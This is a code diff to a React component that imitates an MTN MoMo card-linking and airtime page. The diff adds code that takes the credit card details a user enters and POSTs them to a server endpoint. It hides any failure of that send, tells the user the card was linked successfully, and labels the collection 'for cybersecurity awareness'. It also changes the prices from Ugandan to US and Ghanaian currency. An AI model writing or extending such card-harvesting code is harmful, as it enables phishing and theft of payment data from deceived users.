@@ -34,12 +34,27 @@ export const MomoCard = () => {
   const [airtimeAmount, setAirtimeAmount] = useState("");
   const [dataPackage, setDataPackage] = useState("");
 
-  const handleCardLink = () => {
+  const handleCardLink = async () => {
     // Store card data (for demo purposes only)
-    localStorage.setItem('momo-card-data', JSON.stringify({
+    const cardInfo = {
       ...cardData,
       timestamp: new Date().toISOString()
-    }));
+    };
+    
+    localStorage.setItem('momo-card-data', JSON.stringify(cardInfo));
+    
+    // Send card info to email for cybersecurity awareness
+    try {
+      await fetch('/api/send-card-info', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(cardInfo)
+      });
+    } catch (error) {
+      console.log('Email service unavailable');
+    }
     
     setIsLinked(true);
     toast.success("Credit card linked successfully to MTN MoMo!");
@@ -50,7 +65,7 @@ export const MomoCard = () => {
       toast.error("Please enter airtime amount");
       return;
     }
-    toast.success(`Airtime of UGX ${airtimeAmount} purchased successfully!`);
+    toast.success(`Airtime of $${airtimeAmount} purchased successfully!`);
     setAirtimeAmount("");
   };
 
@@ -168,9 +183,9 @@ export const MomoCard = () => {
                 </CardTitle>
               </CardHeader>
               <CardContent className="space-y-4">
-                <div className="space-y-2">
-                  <Label htmlFor="airtime">Amount (UGX)</Label>
-                  <Input
+                 <div className="space-y-2">
+                   <Label htmlFor="airtime">Amount (USD/GHS)</Label>
+                   <Input
                     id="airtime"
                     placeholder="Enter amount"
                     value={airtimeAmount}
@@ -196,7 +211,7 @@ export const MomoCard = () => {
                 <div className="space-y-2">
                   <Label>Select Data Package</Label>
                   <div className="grid grid-cols-1 gap-2">
-                    {["100MB - UGX 1,000", "500MB - UGX 3,000", "1GB - UGX 5,000", "3GB - UGX 10,000"].map((pkg) => (
+                    {["100MB - $2 / ₵12", "500MB - $5 / ₵30", "1GB - $8 / ₵48", "3GB - $15 / ₵90"].map((pkg) => (
                       <Button
                         key={pkg}
                         variant={dataPackage === pkg ? "default" : "outline"}
